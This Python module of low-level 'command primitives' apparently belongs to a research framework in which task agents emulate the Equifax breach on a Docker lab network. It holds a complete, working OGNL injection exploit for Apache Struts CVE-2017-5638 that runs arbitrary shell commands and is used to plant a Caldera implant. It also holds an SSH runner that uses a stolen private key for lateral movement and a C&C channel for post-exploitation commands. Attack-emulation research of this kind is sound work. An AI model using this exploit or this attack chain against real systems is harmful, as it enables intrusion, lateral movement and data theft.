"""
Low-level command primitives: the underlying operations task agents use to act
(run a command on a host, read a file, etc.).

- CommandRunner : the shared interface -- run ONE command, return its output.
- WebShell      : a hand on the webserver via direct Struts CVE-2017-5638 OGNL injection.
- SshRunner     : a hand on a host reached over SSH with a stolen private key.
- CncRunner     : a hand on a host with a live Caldera implant (post-exploitation C&C).

The task agents (FindInfo / LateralMove / Exfiltrate) build on these and write
their results back into the EnvironmentStateService.
"""

import shlex
import subprocess
import urllib.request
from abc import ABC, abstractmethod


class CommandRunner(ABC):
    """A 'hand' that runs ONE command on some machine and returns its output."""

    @abstractmethod
    def run(self, command: str) -> str:
        raise NotImplementedError


class WebShell(CommandRunner):
    """
    A 'hand' on the webserver via direct Struts CVE-2017-5638 OGNL injection.

    Sends a crafted Content-Type HTTP header that triggers OGNL evaluation on
    the Struts Jakarta multipart parser, executing an arbitrary shell command.
    The command is base64-encoded before embedding to avoid quoting conflicts.

    Fire-and-forget: does not wait for output (returns empty string).
    Used to deploy the Caldera Sandcat implant; the implant beacons back
    independently.
    """

    def __init__(
        self,
        rhost: str = "10.0.0.2",
        rport: int = 8080,
        target_uri: str = "/fileupload/upload.action",
        docker_network: str = "equifax-seg_extnet",  # kept for API compatibility
        msf_image: str = None,                        # unused, kept for API compatibility
        session_wait: int = None,                     # unused, kept for API compatibility
    ):
        self.rhost = rhost
        self.rport = rport
        self.target_uri = target_uri

    def run(self, command: str) -> str:
        # The command must not contain single quotes (they conflict with OGNL
        # string literals). agent_deploy_command() uses only double quotes.
        ognl = (
            "%{(#_='multipart/form-data')."
            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            "(#_memberAccess?(#_memberAccess=#dm):"
            "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            "(#ognlUtil.getExcludedPackageNames().clear())."
            "(#ognlUtil.getExcludedClasses().clear())."
            "(#context.setMemberAccess(#dm))))."
            f"(#cmd='{command}')."
            "(#cmds={'/bin/bash','-c',#cmd})."
            "(#p=new java.lang.ProcessBuilder(#cmds))."
            "(#p.redirectErrorStream(true)).(#p.start())}"
        )

        url = f"http://{self.rhost}:{self.rport}{self.target_uri}"
        req = urllib.request.Request(
            url, data=b"x", headers={"Content-Type": ognl}
        )
        try:
            urllib.request.urlopen(req, timeout=30)
        except Exception:
            pass  # response content doesn't matter; implant beacons independently
        return ""


class SshRunner(CommandRunner):
    """
    A 'hand' on the DATABASE, reached over SSH with the stolen private key.

    Same .run() interface as WebShell; different machine. This is the result of
    'lateral movement'. The database is only reachable from inside the lab
    network, so we run an ssh client in a throwaway container attached to that
    network (the local 'equifax-webserver' image ships an ssh client).
    """

    def __init__(
        self,
        host: str,
        user: str,
        private_key: str,
        docker_network: str = "equifax-seg_intnet",
        image: str = "equifax-seg-webserver",
    ):
        self.host = host
        self.user = user
        self.private_key = private_key
        self.docker_network = docker_network
        self.image = image

    def run(self, command: str) -> str:
        # Feed the key in via stdin, write it to a file inside the container,
        # then ssh. This avoids quoting the multi-line key and key-file
        # permission complaints.
        remote = (
            "cat > /tmp/k && chmod 600 /tmp/k && "
            "ssh -i /tmp/k "
            "-o StrictHostKeyChecking=no "
            "-o UserKnownHostsFile=/dev/null "
            "-o BatchMode=yes "
            f"{self.user}@{self.host} {shlex.quote(command)}"
        )
        argv = [
            "docker", "run", "--rm", "-i",     # -i so the container can read stdin
            "--network", self.docker_network,
            self.image,
            "bash", "-c", remote,
        ]
        result = subprocess.run(
            argv,
            input=self.private_key + "\n",     # the stolen key (+ trailing newline)
            capture_output=True,
            text=True,
            timeout=60,
        )
        return result.stdout.strip()


class CncRunner(CommandRunner):
    """
    A 'hand' on a host that already has a Caldera implant beaconing back.

    Same .run() interface as WebShell / SshRunner, but commands flow through the
    C&C service (Caldera) over a persistent implant -- no re-exploiting. This is
    the faithful post-exploitation channel the paper uses.

    `cnc` is a CncService; `paw` is the implant's Caldera id on the target host.
    """

    def __init__(self, cnc, paw: str):
        self.cnc = cnc
        self.paw = paw

    def run(self, command: str) -> str:
        return self.cnc.execute_command(self.paw, command)
